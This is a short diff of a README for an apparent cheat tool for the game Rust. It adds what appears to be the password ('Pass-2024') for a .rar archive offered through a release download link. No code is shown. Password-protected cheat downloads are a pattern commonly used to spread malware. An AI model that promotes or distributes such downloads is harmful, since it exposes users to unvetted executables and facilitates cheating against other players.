@@ -1,5 +1,6 @@
 # Rust-MDMA Cheat
 # [Download](https://github.com/b3rking/Rust-MDMA/releases/download/Rust/RustMDMA.rar)
+Pass-2024
 
 A little MDMA cheat for Rust. Some basic functions. A basic and easy to update SDK.
 
